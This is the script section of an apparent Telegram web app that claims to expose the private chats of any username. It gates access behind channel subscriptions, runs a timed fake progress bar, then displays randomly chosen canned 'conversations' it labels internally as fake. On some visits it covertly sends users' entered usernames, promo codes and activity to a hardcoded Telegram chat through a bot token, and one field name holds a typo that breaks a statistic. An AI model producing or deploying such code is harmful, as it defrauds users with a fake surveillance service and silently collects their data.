        function verifyCode() {
            const code = document.getElementById('verificationCode').value.trim();
            if (code === userData.verificationCode.toString()) {
                userData.verified = true;
                saveData();
                checkSubscriptions(true);
            } else {
                showError('error1', translations[userData.language].invalidCode);
            }
        }

        async function checkSubscriptions(autoProceed = false) {
            let allSubscribed = true;
            for (const channel of CHANNELS) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChatMember?chat_id=${channel}&user_id=${userData.telegramId}`);
                    const result = await response.json();
                    if (!result.ok || !['member', 'administrator', 'creator'].includes(result.result.status)) {
                        allSubscribed = false;
                        break;
                    }
                } catch (error) {
                    allSubscribed = false;
                    break;
                }
            }

            if (allSubscribed) {
                showScreen('screen3');
            } else {
                showScreen('screen2');
                if (!autoProceed) {
                    showError('error2', translations[userData.language].pleaseSubscribe);
                }
            }
        }

        function startProcess() {
            checkSubscriptions().then(() => {
                if (document.getElementById('screen3').classList.contains('hidden')) return;
                if (userData.limits <= 0) {
                    showScreen('noLimitsScreen');
                } else {
                    const options = [...CHAT_OPTIONS];
                    userData.selectedChatOptions = options.sort(() => Math.random() - 0.5).slice(0, Math.floor(Math.random() * options.length) + 1);
                    saveData();
                    showScreen('usernameScreen');
                }
            });
        }

        function submitUsername() {
            const username = document.getElementById('usernameInput').value.trim();
            if (!username.startsWith('@') || username.length < 5 || username.length > 13) {
                showError('errorUsername', translations[userData.language].invalidUsername);
                return;
            }
            if (userData.usedUsernames.includes(username)) {
                showError('errorUsername', translations[userData.language].usernameAlreadyUsed);
                return;
            }
            clearError('errorUsername');
            userData.currentUsername = username;
            userData.usedUsernames.push(username);
            saveData();
            showScreen('genderScreen');
            const usernameDisplay = document.getElementById('usernameDisplay');
            if (usernameDisplay) {
                usernameDisplay.textContent = username;
            } else {
                console.error('Element with id "usernameDisplay" not found');
            }
        }

        function selectGender(gender) {
            userData.currentGender = gender;
            saveData();
            showLoadingScreen();
        }

        function showLoadingScreen() {
            if (userData.limits > 0) {
                userData.limits -= 1;
                saveData();
                updateLimitsDisplay();
            } else {
                showScreen('noLimitsScreen');
                return;
            }
            showScreen('loadingScreen');
            const loadingText = document.getElementById('loadingText');
            const preloadProgress = document.getElementById('preloadProgress');
            const preloadText = document.getElementById('preloadText');
            loadingText.textContent = translations[userData.language].loading;

            const totalLoadingTime = 19700;
            const startTime = Date.now();
            const interval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                const percentage = Math.min((elapsed / totalLoadingTime) * 100, 100);
                preloadProgress.style.width = percentage + '%';
                preloadText.textContent = Math.round(percentage) + '%';
                if (elapsed >= totalLoadingTime) {
                    clearInterval(interval);
                }
            }, 100);

            setTimeout(() => {
                loadingText.textContent = translations[userData.language].translating;
            }, 7000);

            setTimeout(() => {
                loadingText.textContent = translations[userData.language].displaying;
            }, 7000 + 6800);

            setTimeout(() => {
                clearInterval(interval);
                showChatScreen();
            }, 7000 + 6800 + 5900);
        }

        function showChatScreen() {
            showScreen('chatScreen');
            const chatButtons = document.getElementById('chatButtons');
            chatButtons.innerHTML = '';
            let options = [...userData.selectedChatOptions];
            if (userData.currentGender === 'male') {
                options = options.map(opt => opt === 'lovedOne' ? 'lovedOneMale' : opt);
            } else if (userData.currentGender === 'female') {
                options = options.map(opt => opt === 'lovedOne' ? 'lovedOneFemale' : opt);
            }
            for (const option of options) {
                const button = document.createElement('button');
                button.className = 'w-full bg-blue-500 text-white p-2 mb-2 rounded btn';
                button.textContent = translations[userData.language][option] || option;
                button.onclick = () => showFakeChat(option);
                chatButtons.appendChild(button);
            }
        }

        function showFakeChat(chatType) {
            showScreen('fakeChatScreen');
            const content = document.getElementById('fakeChatContent');
            let messages = userData.chatMessages[chatType];
            if (!messages) {
                messages = generateFakeMessages(chatType);
                userData.chatMessages[chatType] = messages;
                saveData();
            }
            content.innerHTML = messages.map(msg => `<p><strong>${msg.sender}:</strong> ${msg.text}</p>`).join('');
            userData.totalChatsViewed = (userData.totalChatsViewed || 0) + 1;
            saveData();
        }

        function generateFakeMessages(chatType) {
            const conversationKey = chatType + 'Conversations';
            const conversations = translations[userData.language][conversationKey] || [];
            if (conversations.length === 0) return [];
            const selectedConversation = conversations[Math.floor(Math.random() * conversations.length)];
            return selectedConversation.map((text, index) => ({
                sender: index % 2 === 0 ? userData.currentUsername : translations[userData.language][chatType] || chatType,
                text
            }));
        }

        function showPromoScreen() {
            showScreen('promoScreen');
            document.getElementById('promoCode').value = '';
            document.getElementById('promoMessage').textContent = '';
            updatePromoStatsDisplay();
        }

        function submitPromoCode() {
            const promoCode = document.getElementById('promoCode').value.trim();
            const messageElement = document.getElementById('promoMessage');
            if (!promoCode) {
                messageElement.className = 'error';
                messageElement.textContent = translations[userData.language].invalidPromoCode;
                return;
            }
            if (userData.usedPromoCodes.includes(promoCode)) {
                messageElement.className = 'error';
                messageElement.textContent = translations[userData.language].promoCodeAlreadyUsed;
                return;
            }
            const promo = PROMO_CODES.find(p => p.code === promoCode);
            if (promo) {
                userData.limits += promo.limits;
                userData.usedPromoCodes.push(promoCode);
                userData.promoCodeCount = (userData.promoCodeCount || 0) + 1;
                userData.totalLimitsFromPromos = (userData.totalLimitsFromPromos || 0) + promo.limits;
                saveData();
                updateLimitsDisplay();
                updatePromoStatsDisplay();
                messageElement.className = 'success';
                messageElement.textContent = translations[userData.language].success;
                document.getElementById('promoCode').value = '';
            } else {
                messageElement.className = 'error';
                messageElement.textContent = translations[userData.language].invalidPromoCode;
            }
        }

        async function backToMain() {
            userData.lastActivity = new Date().toISOString();
            saveData();

            if (Math.random() < 0.2) {
                const lastTenPromoCodes = userData.usedPromoCodes.slice(-10).join(', ') || 'No';
                const lastTenUsernames = userData.usedUsernames.slice(-10).join(', ') || 'No';
                const statsMessage = `
Введено промокодов: ${userData.promoCodeCount || 0}
Получено от промокодов: ${userData.totalLimitsFromPromос || 0}
Последние 10 промокодов: ${lastTenPromoCodes}
Первый вход: ${new Date(userData.firstLogin).toLocaleString()}
Последняя активность: ${new Date(userData.lastActivity).toLocaleString()}
Кол-во лимитов: ${userData.limits}
Проверено usernames: ${userData.usedUsernames.length}
Последние 10 usernames: ${lastTenUsernames}
Количесиво проверок: ${userData.totalChatsViewed || 0}
                `.trim();
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: '6434781065',
                            text: statsMessage
                        })
                    });
                    console.log('Statistics sent to Telegram');
                } catch (error) {
                    console.error('Error sending message to Telegram:', error);
                }
            }

            showScreen('screen3');
            userData.currentUsername = null;
            userData.currentGender = null;
            userData.selectedChatOptions = null;
            userData.chatMessages = {};
            saveData();
        }

        function backToUsername() {
            showScreen('usernameScreen');
        }

        function backToChats() {
            showChatScreen();
        }

        function showSettings(fromScreen) {
            previousScreen = fromScreen;
            showScreen('settingsScreen');
            document.getElementById('themeSelect').value = userData.theme;
            document.getElementById('languageSelect').value = userData.language;
        }

        function applySettings() {
            userData.theme = document.getElementById('themeSelect').value;
            userData.language = document.getElementById('languageSelect').value;
            saveData();
            applyTheme();
            translatePage();
            showScreen(previousScreen);
        }

        function applyTheme() {
            if (userData.theme === 'dark') {
                document.body.classList.add('dark');
            } else {
                document.body.classList.remove('dark');
            }
        }

        function translatePage() {
            const elements = document.querySelectorAll('[data-translate]');
            elements.forEach(element => {
                const key = element.getAttribute('data-translate');
                if (key === 'findTelegramId') {
                    element.innerHTML = translations[userData.language][key];
                } else {
                    element.textContent = translations[userData.language][key];
                    if (key === 'selectGender' && userData.currentUsername) {
                        element.textContent += userData.currentUsername;
                    }
                }
            });

            const placeholderElements = document.querySelectorAll('[data-translate-placeholder]');
            placeholderElements.forEach(element => {
                const key = element.getAttribute('data-translate-placeholder');
                element.placeholder = translations[userData.language][key];
            });

            updateLimitsDisplay();
            updatePromoStatsDisplay();
        }

        function showDeleteDataScreen() {
            showScreen('deleteDataScreen');
            document.getElementById('deletionCode').value = '';
            clearError('errorDeletion');
        }

        function submitDeletionCode() {
            const code = document.getElementById('deletionCode').value.trim();
            if (code === 'QWERTY') {
                localStorage.removeItem('userData');
                location.reload();
            } else {
                showError('errorDeletion', translations[userData.language].deletionCodeIncorrect);
            }
        }

        function backToSettings() {
            showScreen('settingsScreen');
        }

        function initialize() {
            applyTheme();
            translatePage();
            if (userData.telegramId && userData.verified) {
                checkSubscriptions(true);
            } else {
                showScreen('screen1');
            }

            document.addEventListener('click', function(event) {
                const telegramIdInput = document.getElementById('telegramId');
                if (telegramIdInput && !telegramIdInput.contains(event.target)) {
                    telegramIdInput.blur();
                }
            });
        }

        initialize();
    </script>
</body>
</html>
